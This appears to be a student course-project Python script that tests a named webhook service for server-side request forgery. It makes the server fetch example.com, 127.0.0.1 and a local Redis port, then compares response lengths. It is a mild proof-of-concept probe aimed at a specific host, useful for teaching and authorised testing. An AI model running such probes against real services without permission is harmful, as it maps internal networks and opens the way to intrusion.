# ============================================================
#  Author: Tan Phat Nguyen
#  Vulnerability: SSRF (Server-Side Request Forgery)
#  Target: webhook.0x10.cloud
# ============================================================
#
#  Flow:
#  1. Send requests with controlled URL parameter
#  2. Compare responses between external and internal targets
#  3. Report SSRF if behavior differs
# ============================================================

import time
import urllib.request
import urllib.error

AUTHOR = "Tan Phat Nguyen"
VULNERABILITY = "SSRF (Server-Side Request Forgery)"
HOST = "webhook.0x10.cloud"
BASE_URL = f"http://{HOST}/"
TIMEOUT = 5
RATE_LIMIT_DELAY = 0.15
USER_AGENT = "COMP2152-Term-Project/1.0"

def rate_limit_pause():
    time.sleep(RATE_LIMIT_DELAY)

def fetch_length(target_url):
    try:
        req = urllib.request.Request(target_url, headers={"User-Agent": USER_AGENT})
        res = urllib.request.urlopen(req, timeout=TIMEOUT)
        body = res.read().decode("utf-8", "ignore")
        return len(body)
    except:
        return -1

def test_ssrf(base_url):
    findings = []

    print("    [*] Testing external request...")
    rate_limit_pause()
    external_len = fetch_length(base_url + "?url=http://example.com")
    print(f"    External response length: {external_len}")

    print("\n    [*] Testing internal request (127.0.0.1)...")
    rate_limit_pause()
    internal_len = fetch_length(base_url + "?url=http://127.0.0.1")
    print(f"    Internal response length: {internal_len}")

    print("\n    [*] Testing internal service (Redis port)...")
    rate_limit_pause()
    redis_len = fetch_length(base_url + "?url=http://127.0.0.1:6379")
    print(f"    Redis response length: {redis_len}")

    if internal_len != -1 and internal_len != external_len:
        print("\n    [!] VULNERABILITY: SSRF detected!")
        print("    The server fetches internal resources (127.0.0.1)")
        print("    Risk: Internal services can be accessed by attacker")
        findings.append("127.0.0.1")

    if redis_len != -1 and redis_len != external_len:
        print("\n    [!] VULNERABILITY: Internal port access detected!")
        print("    The server can access internal services like Redis (6379)")
        print("    Risk: Unauthorized access to internal network")
        findings.append("127.0.0.1:6379")

    if not findings:
        print("\n    [OK] No SSRF evidence found.")

    return findings

def print_banner():
    print("=" * 60)
    print("  COMP2152 Term Project - Personal Vulnerability Script")
    print("=" * 60)
    print(f"  Author:        {AUTHOR}")
    print(f"  Target:        {HOST}")
    print(f"  Finding:       {VULNERABILITY}")
    print("=" * 60)

def verify_service(base_url):
    try:
        req = urllib.request.Request(base_url, headers={"User-Agent": USER_AGENT})
        res = urllib.request.urlopen(req, timeout=TIMEOUT)
        body = res.read().decode("utf-8", "ignore")

        if "Webhook" in body or "url" in body.lower():
            print(f"    [OK] Webhook service confirmed at {base_url}")
            return True

        print(f"    [WARN] Unexpected response from {base_url}")
        return False

    except Exception as e:
        print(f"    [ERROR] Cannot reach service: {e}")
        return False

def main():
    print_banner()

    print("\n[1] CONNECT")
    print(f"    Target host:    {HOST}")
    print(f"    Base URL:       {BASE_URL}")

    if not verify_service(BASE_URL):
        print("    [!] Service not reachable. Aborting.")
        return

    print("\n[2] CHECK")
    findings = test_ssrf(BASE_URL)

    print("\n[3] REPORT")
    if findings:
        print("    [!] VULNERABILITY CONFIRMED")
        for f in findings:
            print(f"    SSRF via: {f}")
        print("    Risk: Server can be forced to access internal resources.")
    else:
        print("    [OK] No SSRF vulnerability detected.")

    print("\n" + "=" * 60)

if __name__ == "__main__":
    main()